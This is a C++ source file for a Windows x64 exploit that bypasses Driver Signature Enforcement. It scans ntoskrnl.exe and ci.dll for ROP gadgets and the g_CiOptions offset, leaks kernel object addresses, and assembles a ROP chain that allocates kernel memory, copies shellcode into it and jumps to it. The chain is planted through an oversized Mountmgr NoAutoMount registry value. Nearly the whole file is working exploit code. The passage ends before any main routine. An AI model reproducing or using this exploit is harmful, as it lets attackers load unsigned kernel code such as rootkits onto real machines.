// x64DSEBypass.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "psapi.h"
#include "resource.h"
#include "shlwapi.h"

typedef struct ROP_ADDRINFO{
	ULONG OffsetSetRcxRdxRax ; 
	ULONG OffsetSetR8 ; 
	ULONG OffsetExAllocatePool ; 
	ULONG OffsetMmCopyVirtualMemory ; 
	ULONG OffsetSaveRaxToRcx ;
	ULONG OffsetLoadRaxFromRcx ; 
	ULONG OffsetJumpRax ; 
	ULONG OffsetKiBugcheckData ; 
	ULONG OffsetLoadRdxFromRcx ; 
	ULONG OffsetMoveRdxToR9;
	ULONG OffsetAddRsp0x28 ; 
	ULONG OffsetKeDelayExecutionThread ; 
	ULONG OffsetgCiOptions ; 
}ROP_ADDRINFO , *PROP_ADDRINFO;

#pragma comment(lib , "psapi.lib")
#pragma comment(lib , "shlwapi.lib")

WCHAR System32Dir[MAX_PATH];

ULONG FindCiOptions()
{
	WCHAR CiDllPath[MAX_PATH];

	if (PathCombine(CiDllPath , System32Dir , L"ci.dll") == NULL)
	{
		return NULL ; 
	}

	HMODULE hlibci = LoadLibraryExW(CiDllPath , 0 , DONT_RESOLVE_DLL_REFERENCES);
	MODULEINFO modinfo ; 

	if (hlibci == 0 )
	{
		printf("load ci failed %u\n" ,GetLastError());
		return NULL ; 
	}

	if (GetModuleInformation(GetCurrentProcess() , hlibci , &modinfo , sizeof(MODULEINFO)) == FALSE)
	{
		printf("get ci module information failed\n");
		FreeLibrary(hlibci);
		return NULL ; 
	}

	PVOID pCiInitialize = GetProcAddress(hlibci , "CiInitialize");

	if (pCiInitialize == NULL)
	{
		FreeLibrary(hlibci);
		printf("cannot find ci!CiInitialize\n");
		return NULL;
	}

	ULONG i ; 

	//find :
	//jmp CipInitialize
	//..function end (0xcc or 0x90)
	//

	for (i = 0 ; i < 0x100 ; i ++)
	{
		if (*(BYTE*)((ULONG_PTR)pCiInitialize + i) == 0xE9 &&
			(*(BYTE*)((ULONG_PTR)pCiInitialize + i + 5) == 0xCC || *(BYTE*)((ULONG_PTR)pCiInitialize + 5) == 0x90)) 
		{
			break ; 
		}
	}

	if (i == 0x100)
	{
		printf("Cannot find ci!CipInitialize\n");
		FreeLibrary(hlibci);
		return NULL ; 
	}
		
	//calculate address of CipInitialize
	
	PVOID pCipInitialize = (PVOID)(*(LONG*)((ULONG_PTR)pCiInitialize + i + 1) + 5 + (ULONG_PTR)pCiInitialize + i );

	//is CipInitialize in ci.dll module area

	if ((ULONG_PTR)pCipInitialize <= (ULONG_PTR)hlibci ||
		(ULONG_PTR)pCipInitialize >= (ULONG_PTR)hlibci + modinfo.SizeOfImage - 0x120)
	{
		printf("ci!CipInitialize illegal\n");
		FreeLibrary(hlibci);
		return NULL ; 
	}

	//find :
	// mov cs:XXXXX , rax  ... g_CiKernelApis
	// mov cs:XXXXX , ecx  ... g_CiOptions
	//

	for (i = 0 ; i < 0x100 ; i ++)
	{
		if (*(WORD*)((ULONG_PTR)pCipInitialize + i) == 0x8948 &&
			*(BYTE*)((ULONG_PTR)pCipInitialize + i + 0x2) == 0x5 &&
			*(WORD*)((ULONG_PTR)pCipInitialize + i + 0x7) == 0x0D89)
		{
			break ; 
		}
	}

	if (i == 0x100)
	{
		printf("cannot find g_CiOptins in CipInitialize\n");
		FreeLibrary(hlibci);
		return NULL ; 
	}

	//calculate address of g_CiOptions ;

	PVOID pg_CiOptions = (PVOID)(*(LONG*)((ULONG_PTR)pCipInitialize + i + 0x9) + (ULONG_PTR)pCipInitialize + i + 0x7 + 0x6 );


	if ((ULONG_PTR)pg_CiOptions <= (ULONG_PTR)hlibci ||
		(ULONG_PTR)pg_CiOptions >= (ULONG_PTR)hlibci + modinfo.SizeOfImage)
	{
		printf("ci!pg_CiOptions illegal\n");
		FreeLibrary(hlibci);
		return NULL ; 
	}

	FreeLibrary(hlibci);

	return (ULONG)((ULONG_PTR)pg_CiOptions - (ULONG_PTR)hlibci)  ; 
}
BOOL FindROPCodes(PROP_ADDRINFO pRopInfo)
{
	WCHAR NtkrnlPath[MAX_PATH];

	if (PathCombine(NtkrnlPath , System32Dir , L"ntoskrnl.exe") == NULL)
	{
		return NULL ; 
	}

	HMODULE hlibnt = LoadLibraryExW(NtkrnlPath , 0 , DONT_RESOLVE_DLL_REFERENCES);
	MODULEINFO modinfo ; 

	if (hlibnt == 0 )
	{
		printf("cannot load ntoskrnl\n");
		return FALSE ; 
	}

	if (GetModuleInformation(GetCurrentProcess() , hlibnt , &modinfo , sizeof(MODULEINFO)) == FALSE)
	{
		printf("cannot get module information for ntoskrnl\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

	//get address of PoAllProcessorsDeepIdle for fast scan

	PVOID pPoAllProcessorsDeepIdle = GetProcAddress(hlibnt , "PoAllProcessorsDeepIdle");
	
	if (pPoAllProcessorsDeepIdle == NULL)
	{
		printf("cannot get address of PoAllProcessorsDeepIdle fast scan failed\n");
		goto fullscan ;
	}

	if ((ULONG_PTR)pPoAllProcessorsDeepIdle - 0x1000 < (ULONG_PTR)hlibnt)
	{
		printf("PoAllProcessorsDeepIdle value too small , fast scan failed\n");
		goto fullscan ; 
	}

	ULONG i ; 

	//find HvlEndSystemInterrupt
	// pop     rdx
	// pop     rax
	// pop     rcx
	// retn

	for (i = 0 ; i < 0x1000 ; i ++)
	{
		if (*(DWORD*)((ULONG_PTR)pPoAllProcessorsDeepIdle - i) == 0xC359585A)
		{
			break ; 
		}
	}
	if (i == 0x1000)
	{
		printf("cannot find Set RCX/RDX/RAX ROP Code in fast scan , go full scan\n");
		goto fullscan ; 
	}

	i = (ULONG)((ULONG_PTR)pPoAllProcessorsDeepIdle - (ULONG_PTR)hlibnt - i );

	goto findROP1OK ; 
fullscan:
	for (i = 0 ; i < modinfo.SizeOfImage ; i ++)
	{
		if (*(DWORD*)((ULONG_PTR)hlibnt + i) == 0xC359585A)
		{
			break ; 
		}
	}
	if (i == modinfo.SizeOfImage)
	{
		printf("cannot find set RCX/RDX/RAX ROP Code in full scan\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}
findROP1OK:
	pRopInfo->OffsetSetRcxRdxRax = i ;
	
	PVOID pKeSetHardwareCounterConfiguration = GetProcAddress(hlibnt , "KeSetHardwareCounterConfiguration");

	if (pKeSetHardwareCounterConfiguration == NULL)
	{
		printf("cannot get address of KeSetHardwareCounterConfiguration\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}
	pRopInfo->OffsetSetR8 = (ULONG)((ULONG_PTR)pKeSetHardwareCounterConfiguration - (ULONG_PTR)hlibnt);

// PAGE:0000000140568520                         KeSetHardwareCounterConfiguration proc near
// PAGE:0000000140568520 4C 8B C1                                mov     r8, rcx
// PAGE:0000000140568523 83 FA 10                                cmp     edx, 10h
// PAGE:0000000140568526 76 06                                   jbe     short loc_14056852E
// PAGE:0000000140568528 B8 0D 00 00 C0                          mov     eax, 0C000000Dh
// PAGE:000000014056852D C3                                      retn

	PVOID pExAllocatePool = GetProcAddress(hlibnt , "ExAllocatePool");

	if (pExAllocatePool == NULL)
	{
		printf("cannot get address of ExAllocatePool\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}
	
	pRopInfo->OffsetExAllocatePool = (ULONG)((ULONG_PTR)pExAllocatePool - (ULONG_PTR)hlibnt);

	PVOID pMmCopyVirtualMemory = GetProcAddress(hlibnt , "MmCopyVirtualMemory");

	if (pMmCopyVirtualMemory == NULL)
	{
		printf("cannot get address of MmCopyVirtualMemory\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

	pRopInfo->OffsetMmCopyVirtualMemory = (ULONG)((ULONG_PTR)pMmCopyVirtualMemory - (ULONG_PTR)hlibnt);

	PVOID pPsGetThreadTeb = GetProcAddress(hlibnt , "PsGetThreadTeb");

	if (pPsGetThreadTeb == NULL)
	{
		printf("cannot get address of PsGetThreadTeb\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}
// 
// .text:000000014003E9F8                         PsGetThreadTeb  proc near               ; CODE XREF: PspWow64ReadOrWriteThreadCpuArea+63p
// .text:000000014003E9F8                                                                 ; EtwpTraceThreadRundown+B4p
// .text:000000014003E9F8 48 8B 81 F0 00 00 00                    mov     rax, [rcx+0F0h]
// .text:000000014003E9FF C3                                      retn
// .text:000000014003E9FF                         PsGetThreadTeb  endp
	
	pRopInfo->OffsetLoadRaxFromRcx = (ULONG)((ULONG_PTR)pPsGetThreadTeb - (ULONG_PTR)hlibnt);

	PVOID pKeInitializeEnumerationContext = GetProcAddress(hlibnt , "KeInitializeEnumerationContext");

	if (pKeInitializeEnumerationContext == NULL)
	{
		printf("cannot get address of KeInitializeEnumerationContext\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

//.text:00000001400A86CC                         KeInitializeEnumerationContext proc near
//.text:00000001400A86CC 33 C0                                   xor     eax, eax
//.text:00000001400A86CE 66 89 41 10                             mov     [rcx+10h], ax
//.text:00000001400A86D2 48 8B 42 08                             mov     rax, [rdx+8]
//.text:00000001400A86D6 48 89 11                                mov     [rcx], rdx
//.text:00000001400A86D9 48 89 41 08                             mov     [rcx+8], rax
//.text:00000001400A86DD C3                                      retn


	pRopInfo->OffsetSaveRaxToRcx = (ULONG)((ULONG_PTR)pKeInitializeEnumerationContext - (ULONG_PTR)hlibnt + 0xD) ;

	PVOID pIofCallDriver = GetProcAddress(hlibnt , "IofCallDriver");

	if (pIofCallDriver == NULL)
	{
		printf("cannot get address of IofCallDriver\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

	for (i = 0 ; i < 0x100 ; i ++)
	{
		if (*(WORD*)((ULONG_PTR)pIofCallDriver + i ) == 0xFF48 &&
			*(BYTE*)((ULONG_PTR)pIofCallDriver + i + 0x2) == 0xE0)
		{
			break ; 
		}
	}
	if ( i == 0x100)
	{
		printf("cannot find jump rax in IofCallDriver\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

	pRopInfo->OffsetJumpRax = (ULONG)((ULONG_PTR)pIofCallDriver + i - (ULONG_PTR)hlibnt);

	PVOID pKiBugCheckData = GetProcAddress(hlibnt , "KiBugCheckData");

	if (pKiBugCheckData == NULL)
	{
		printf("cannot get address of KiBugCheckData\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

	pRopInfo->OffsetKiBugcheckData = (ULONG)((ULONG_PTR)pKiBugCheckData - (ULONG_PTR)hlibnt);

	PVOID pRtlIsServicePackVersionInstalled = GetProcAddress(hlibnt , "RtlIsServicePackVersionInstalled");

	if (pRtlIsServicePackVersionInstalled == NULL)
	{
		printf("cannot get address of RtlIsServicePackVersionInstalled\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

	for (i = 0 ; i < 0x1000 ; i++)
	{
		if (*(DWORD*)((ULONG_PTR)pRtlIsServicePackVersionInstalled + i ) == 0x08518B48 &&
			*(DWORD*)((ULONG_PTR)pRtlIsServicePackVersionInstalled + i + 0x4) == 0x10513948 &&
			*(DWORD*)((ULONG_PTR)pRtlIsServicePackVersionInstalled + i + 0x8) == 0xC3C0940F)
		{
			break ; 
		}
	}
//.text:000000014019BD80 48 8B 51 08                             mov     rdx, [rcx+8]
//.text:000000014019BD84 48 39 51 10                             cmp     [rcx+10h], rdx
//.text:000000014019BD88 0F 94 C0                                setz    al
//.text:000000014019BD8B C3                                      retn

	if (i == 0x100)
	{
		printf("cannot find address of RtlIsServicePackVersionInstalled\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}
	
	pRopInfo->OffsetLoadRdxFromRcx = (ULONG)((ULONG_PTR)pRtlIsServicePackVersionInstalled + i - (ULONG_PTR)hlibnt);

	PVOID pEtwEventEnabled = GetProcAddress(hlibnt , "EtwEventEnabled");

	if (pEtwEventEnabled == NULL)
	{
		printf("cannot get address of EtwEventEnabled\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}
// 	.text:0000000140065130                         EtwEventEnabled proc near               ; CODE XREF: PpmEventTraceFailedPerfCheckStart+33p
// 	.text:0000000140065130                                                                 ; PiDrvDbUnloadNodeWaitWorkerCallback+8Ep ...
// 	.text:0000000140065130 45 33 C0                                xor     r8d, r8d
// 	.text:0000000140065133 4C 8B CA                                mov     r9, rdx
// 	.text:0000000140065136 48 85 C9                                test    rcx, rcx
// 	.text:0000000140065139 74 3D                                   jz      short loc_140065178

	if (*(DWORD*)pEtwEventEnabled == 0x4CC03345 &&
		*(DWORD*)((ULONG_PTR)pEtwEventEnabled + 4) == 0x8548CA8B &&
		*(DWORD*)((ULONG_PTR)pEtwEventEnabled + 8) == 0x483D74C9)
	{
		pRopInfo->OffsetMoveRdxToR9 = (ULONG)((ULONG_PTR)pEtwEventEnabled + 3 - (ULONG_PTR)hlibnt);
	}
	else
	{
		printf("code mismatch in EtwEventEnable\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

	PVOID pMmMapIoSpace = GetProcAddress(hlibnt , "MmMapIoSpace");

	if (pMmMapIoSpace == NULL)
	{
		printf("cannot get address of MmMapIoSpace\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

	if (*(DWORD*)((ULONG_PTR)pMmMapIoSpace + 0xC) != 0x28C48348 ||
		*(BYTE*)((ULONG_PTR)pMmMapIoSpace + 0x10) != 0xC3)
	{
		printf("code mismatch in MmMapIoSpace\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

	pRopInfo->OffsetAddRsp0x28 = (ULONG)((ULONG_PTR)pMmMapIoSpace + 0xC - (ULONG_PTR)hlibnt);

	PVOID pKeDelayExecutionThread = GetProcAddress(hlibnt , "KeDelayExecutionThread");

	if (pKeDelayExecutionThread == NULL)
	{
		printf("cannot get address of KeDelayExecutionThread\n");
		FreeLibrary(hlibnt);
		return FALSE ; 
	}

	pRopInfo->OffsetKeDelayExecutionThread = (ULONG)((ULONG_PTR)pKeDelayExecutionThread - (ULONG)hlibnt);

	FreeLibrary(hlibnt);

	return TRUE ; 

}

BOOL EnableDisabledPriv( LPCTSTR szPrivilege )
{
	HANDLE hToken;
	LUID seluidvalue;
	TOKEN_PRIVILEGES tkp;
	DWORD TokenInfoLen ; 
	ULONG i ; 

	if ( !OpenProcessToken( GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken ) )
	{
		return FALSE;
	}

	if ( !LookupPrivilegeValue( NULL, szPrivilege, &seluidvalue ) )
	{
		CloseHandle( hToken );
		return FALSE;
	}

	if (GetTokenInformation(hToken , TokenPrivileges , NULL , 0 , &TokenInfoLen ) == FALSE &&
		GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		PTOKEN_PRIVILEGES pTokenPriv = (PTOKEN_PRIVILEGES)VirtualAlloc(NULL , TokenInfoLen , MEM_COMMIT , PAGE_READWRITE);

		if (pTokenPriv == NULL)
		{
			CloseHandle(hToken);
			return FALSE; 
		}

		if (GetTokenInformation(hToken , TokenPrivileges , pTokenPriv , TokenInfoLen , &TokenInfoLen) == FALSE)
		{
			VirtualFree(pTokenPriv , 0 , MEM_RELEASE);
			CloseHandle(hToken);
			return FALSE ; 
		}
		
		for (i = 0 ; i < pTokenPriv->PrivilegeCount ; i++)
		{
			if (pTokenPriv->Privileges[i].Luid.HighPart == seluidvalue.HighPart &&
				pTokenPriv->Privileges[i].Luid.LowPart == seluidvalue.LowPart)
			{
				break ;
			}
		}

		//do not have this privilege 

		if (i == pTokenPriv->PrivilegeCount)
		{
			VirtualFree(pTokenPriv , 0 , MEM_RELEASE);
			CloseHandle(hToken);
			return FALSE ; 
		}

		if (pTokenPriv->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED ||
			pTokenPriv->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
		{
			VirtualFree(pTokenPriv , 0 , MEM_RELEASE);
			CloseHandle(hToken);
			return TRUE ; 
		}
		VirtualFree(pTokenPriv , 0 , MEM_RELEASE);

	}
	else
	{
		CloseHandle(hToken);
		return FALSE ; 
	}


	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = seluidvalue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if ( !AdjustTokenPrivileges( hToken, FALSE, &tkp, sizeof tkp, NULL, NULL ) )
	{
		CloseHandle( hToken );
		return FALSE;
	}

	return TRUE;
}

typedef NTSTATUS (NTAPI *PNT_QUERY_SYSTEM_INFORMATION)(ULONG SystemInformationClass , PVOID SystemInformation , ULONG SystemInformationLength , PULONG ReturnLength);
#define SystemModuleInformation 11

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	HANDLE Section;                 // Not filled in
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR  FullPathName[ 256 ];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[ 1 ];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
PNT_QUERY_SYSTEM_INFORMATION pNtQuerySystemInformation;


BOOL GetKernelModuleInformation(PULONG_PTR NtoskrnlBase , PULONG_PTR CiBase)
{
	pNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandleA("ntdll.dll") , "NtQuerySystemInformation");
	DWORD ReturnLength ; 
	NTSTATUS status ; 

	if (pNtQuerySystemInformation == NULL)
	{		
		return FALSE ; 
	}
	
	status = pNtQuerySystemInformation(SystemModuleInformation , NULL , 0 , &ReturnLength  );

	if (status != STATUS_INFO_LENGTH_MISMATCH)
	{
		return FALSE ; 
	}

	PRTL_PROCESS_MODULES ModuleInfo = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL , ReturnLength , MEM_COMMIT , PAGE_READWRITE);

	if (ModuleInfo == NULL)
	{
		return FALSE ; 
	}

	status = pNtQuerySystemInformation(SystemModuleInformation , ModuleInfo , ReturnLength , &ReturnLength);

	if (!NT_SUCCESS(status))
	{
		VirtualFree(ModuleInfo , NULL , MEM_RELEASE);
		return FALSE ; 
	}

	*NtoskrnlBase = (ULONG_PTR)ModuleInfo->Modules[0].ImageBase;

	ULONG i ; 

	for (i = 0 ; i < ModuleInfo->NumberOfModules ; i++)
	{
		if (_stricmp((const char*)ModuleInfo->Modules[i].FullPathName , "\\SystemRoot\\system32\\CI.dll") == 0 )
		{
			break ;
		}
	}
	if (i != ModuleInfo->NumberOfModules)
	{
		*CiBase = (ULONG_PTR)ModuleInfo->Modules[i].ImageBase ;
	}

	VirtualFree(ModuleInfo , NULL , MEM_RELEASE);

	return TRUE ; 
}

#define SystemExtendedHandleInformation 64

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
	PVOID Object;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG  HandleAttributes;
	ULONG  Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[ 1 ];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

PVOID GetKEventObject(HANDLE hEvent)
{
	NTSTATUS status ; 
	SYSTEM_HANDLE_INFORMATION_EX TempInfo ;
	DWORD ReturnLength ; 
	ULONG_PTR CurrentPid = GetCurrentProcessId();
	PVOID pEventObject ; 
	
	if (pNtQuerySystemInformation == 0 )
	{
		pNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandleA("ntdll.dll") , "NtQuerySystemInformation");
		if (pNtQuerySystemInformation == 0 )
		{
			return NULL ; 
		}
	}

	status = pNtQuerySystemInformation(SystemExtendedHandleInformation , &TempInfo , sizeof(TempInfo) , &ReturnLength);

	if (status != STATUS_INFO_LENGTH_MISMATCH)
	{
		return NULL ; 
	}

	PSYSTEM_HANDLE_INFORMATION_EX pHandles = (PSYSTEM_HANDLE_INFORMATION_EX)VirtualAlloc(NULL , ReturnLength , MEM_COMMIT , PAGE_READWRITE);

	status = pNtQuerySystemInformation(SystemExtendedHandleInformation , pHandles , ReturnLength , &ReturnLength);

	if (!NT_SUCCESS(status))
	{
		VirtualFree(pHandles , 0 , MEM_RELEASE);
		return NULL ; 
	}

	ULONG i ; 

	for (i = 0 ; i < pHandles->NumberOfHandles ; i ++)
	{
		if (pHandles->Handles[i].UniqueProcessId == CurrentPid)
		{
			if (pHandles->Handles[i].HandleValue == (ULONG_PTR)hEvent)
			{
				break ;
			}
		}
	}

	if (i == pHandles->NumberOfHandles)
	{
		VirtualFree(pHandles , 0 , MEM_RELEASE);
		return NULL ; 
	}
	pEventObject = pHandles->Handles[i].Object ; 

	VirtualFree(pHandles , 0 , MEM_RELEASE);

	return pEventObject ; 
}

PVOID GetCurrentProcessObjectAddressByHandle(HANDLE Handle)
{
	NTSTATUS status ; 
	SYSTEM_HANDLE_INFORMATION_EX TempInfo ;
	DWORD ReturnLength ; 
	ULONG_PTR CurrentPid = GetCurrentProcessId();
	PVOID pObject ; 

	if (pNtQuerySystemInformation == 0 )
	{
		pNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandleA("ntdll.dll") , "NtQuerySystemInformation");
		if (pNtQuerySystemInformation == 0 )
		{
			return NULL ; 
		}
	}

	status = pNtQuerySystemInformation(SystemExtendedHandleInformation , &TempInfo , sizeof(TempInfo) , &ReturnLength);

	if (status != STATUS_INFO_LENGTH_MISMATCH)
	{
		return NULL ; 
	}

	PSYSTEM_HANDLE_INFORMATION_EX pHandles = (PSYSTEM_HANDLE_INFORMATION_EX)VirtualAlloc(NULL , ReturnLength , MEM_COMMIT , PAGE_READWRITE);

	status = pNtQuerySystemInformation(SystemExtendedHandleInformation , pHandles , ReturnLength , &ReturnLength);

	if (!NT_SUCCESS(status))
	{
		VirtualFree(pHandles , 0 , MEM_RELEASE);
		return NULL ; 
	}

	ULONG i ; 

	for (i = 0 ; i < pHandles->NumberOfHandles ; i ++)
	{
		if (pHandles->Handles[i].UniqueProcessId == CurrentPid)
		{
			if (pHandles->Handles[i].HandleValue == (ULONG_PTR)Handle)
			{
				break ;
			}
		}
	}


	if (i == pHandles->NumberOfHandles)
	{
		VirtualFree(pHandles , 0 , MEM_RELEASE);
		return NULL ; 
	}
	pObject = pHandles->Handles[i].Object ; 

	VirtualFree(pHandles , 0 , MEM_RELEASE);

	return pObject ;  
}
#define SET_RCX_OFFSET 0x2
#define SET_RCX_RAX_OFFSET 0x1
#define SET_RCX_RAX_RDX_OFFSET 0x0

PVOID PrepareOverwriteStack(PROP_ADDRINFO pRopInfo ,  
							ULONG_PTR NtBase , 
							ULONG_PTR CiBase , 
							ULONG_PTR ShellCodeAddress ,
							ULONG ShellCodeLen ,
							PULONG ReturnLength)
{
	HANDLE hThread , hProcess ; 
	PVOID pShellCodeBuffer ; 
	DWORD i ; 

	hThread = OpenThread(THREAD_ALL_ACCESS , FALSE , GetCurrentThreadId());

	PVOID pThreadObject = GetCurrentProcessObjectAddressByHandle(hThread);

	CloseHandle(hThread);

	if (pThreadObject == NULL)
	{
		return NULL ; 
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS , FALSE , GetCurrentProcessId());

	PVOID pProcessObject = GetCurrentProcessObjectAddressByHandle(hProcess);

	CloseHandle(hProcess);

	if (pProcessObject == NULL)
	{
		return NULL ; 
	}

	PULONG_PTR pBuffer = (PULONG_PTR)VirtualAlloc(NULL , 0x2000 , MEM_COMMIT , PAGE_READWRITE);

	if (pBuffer == NULL)
	{
		return NULL ; 
	}

	pShellCodeBuffer = (PVOID)((ULONG_PTR)pBuffer + 0x1000);

	memcpy(pShellCodeBuffer , (PVOID)ShellCodeAddress , ShellCodeLen );

	for (i = 0 ; i < ShellCodeLen ; i ++)
	{
		if (*(ULONGLONG*)((ULONG_PTR)pShellCodeBuffer + i) == 0xAAAAAAAAAAAAAAAA)
		{
			*(ULONGLONG*)((ULONG_PTR)pShellCodeBuffer + i ) = pRopInfo->OffsetKeDelayExecutionThread + NtBase;
		}

		if (*(ULONGLONG*)((ULONG_PTR)pShellCodeBuffer + i ) == 0xBBBBBBBBBBBBBBBB)
		{
			*(ULONGLONG*)((ULONG_PTR)pShellCodeBuffer + i ) = pRopInfo->OffsetgCiOptions + CiBase ; 
		}
	}


	pBuffer[0] = 0x0 ;// outside arg_8 NoAutoMount overwrite from RSP-0x58
	pBuffer[1] = 0x0 ;//nothing
	pBuffer[2] = 0x0 ;//var_48
	pBuffer[3] = 0x0 ;//var_40
	pBuffer[4] = 0x0 ;//var_38
	pBuffer[5] = 0x0 ;//nothing

	pBuffer[6] = 0x0 ; //saved r14
	pBuffer[7] = 0x0 ; //saved r13
	pBuffer[8] = 0x0 ; //saved r12
	pBuffer[9] = 0x0 ; //saved rdi
	pBuffer[10] = 0x0 ; //saved rsi

	//allocate memory step 1 : set rdx = 0 

	pBuffer[11] = pRopInfo->OffsetSetRcxRdxRax + NtBase + SET_RCX_RAX_RDX_OFFSET; //return address 1
	pBuffer[12] = 0x1000 ; 
	pBuffer[13] = 0 ; 
	pBuffer[14] = (ULONG_PTR)pThreadObject ;//overwrite DeviceObject var

	//allocate memory step 2: set rcx = 0x1000 (number of bytes)

	pBuffer[15] = pRopInfo->OffsetSetRcxRdxRax + NtBase + SET_RCX_OFFSET ;//set rcx
	pBuffer[16] = 0 ;
	
	//call allocate memory

	pBuffer[17] = pRopInfo->OffsetExAllocatePool + NtBase ; 

	//save memory buffer address, step 1 : load KiBugCheckData address(kibugcheckdata -> rcx)

	//EXALLOCATE WILL DESTORY RSP + 0x8 / RSP + 0x10 / RSP + 0x20
	pBuffer[18] = pRopInfo->OffsetAddRsp0x28 + NtBase ;
	pBuffer[19] = 0 ; //rsp+8
	pBuffer[20] = 0 ; //rsp+0x10
		
	pBuffer[21] = 0 ; //rsp +0x18
	pBuffer[22] = 0 ; //rsp+0x20
	pBuffer[23] = 0 ; 

	pBuffer[24] = pRopInfo->OffsetSetRcxRdxRax + NtBase + SET_RCX_OFFSET ; 

	pBuffer[25] = pRopInfo->OffsetKiBugcheckData + NtBase;
	

	//save memory buffer address , step 2: save to KiBugCheckData + 8 (mov [rcx+8],rax)

	pBuffer[26] = pRopInfo->OffsetSaveRaxToRcx + NtBase ; 

	//set r9 = buffer address step 1 : set [rcx+8]->rdx

	pBuffer[27] = pRopInfo->OffsetLoadRdxFromRcx + NtBase ; 

	//set r9 = buffer address step 2 : set rcx = 0 

	pBuffer[28] = pRopInfo->OffsetSetRcxRdxRax + NtBase + SET_RCX_OFFSET ; //set rcx = 0 ;
	pBuffer[29] = 0 ; 

	//set r9 = buffer address step 3: set rdx->r9

	pBuffer[30] = pRopInfo->OffsetMoveRdxToR9 + NtBase ; //rcx must be zero

	//set rcx = target process = source process(target in system space)

	pBuffer[31] = pRopInfo->OffsetSetRcxRdxRax + NtBase + SET_RCX_OFFSET ; 
	pBuffer[32] = (ULONG_PTR)pProcessObject;

	//set r8(rdx = buffer address >= 0x10)
	
	pBuffer[33] = pRopInfo->OffsetSetR8 + NtBase ; 

	//set rcx = process object
	//set rdx = shell code address
	pBuffer[34] = pRopInfo->OffsetSetRcxRdxRax + NtBase + SET_RCX_RAX_RDX_OFFSET;
	pBuffer[35] = (ULONG_PTR)pShellCodeBuffer ; 
	pBuffer[36] = 0 ; 
	pBuffer[37] = (ULONG_PTR)pProcessObject ; 

	//call MmCopyVirtualMemory 

	pBuffer[38] = pRopInfo->OffsetMmCopyVirtualMemory + NtBase ;

	//set rcx = KiBugCheckData + 4 
	pBuffer[39] = pRopInfo->OffsetSetRcxRdxRax + NtBase + SET_RCX_OFFSET; 
	pBuffer[40] = pRopInfo->OffsetKiBugcheckData + NtBase - 0xE8 ; 

	//load rax from kibugcheckdata 
	pBuffer[41] = pRopInfo->OffsetLoadRaxFromRcx + NtBase ;

	//jmp rax shell code

	pBuffer[42] = pRopInfo->OffsetJumpRax + NtBase ; 

	pBuffer[43] = 0 ; //0x20
	pBuffer[44] = 0x1000;//rsp+0x28,buffer size
	pBuffer[45] = 0x0 ;//rsp+0x30 , previous mode
	pBuffer[46] = pRopInfo->OffsetKiBugcheckData + NtBase ; //rsp+0x38 ,NumberOfBytes 

	*ReturnLength = 47 * sizeof(ULONG_PTR);

	return pBuffer ; 
}

WCHAR MountMgrServiceKey[] = L"System\\CurrentControlSet\\Services\\Mountmgr";


BOOL SetMountMgrRegistry(PVOID DataBuffer , ULONG DataLength , PHKEY hkeysvc)
{
	HKEY hkey ; 
	DWORD dwret ; 

	dwret = RegOpenKeyEx(HKEY_LOCAL_MACHINE , MountMgrServiceKey, 0 , KEY_WRITE , &hkey);

	if (dwret != ERROR_SUCCESS)
	{
		return FALSE; 
	}

	dwret = RegSetValueExW(hkey , L"NoAutoMount" , 0 , REG_BINARY , (CONST BYTE*)DataBuffer , DataLength);

	if (dwret != ERROR_SUCCESS)
	{
		RegCloseKey(hkey);
		return FALSE ; 
	}

	*hkeysvc = hkey ; 

	return TRUE ; 

}




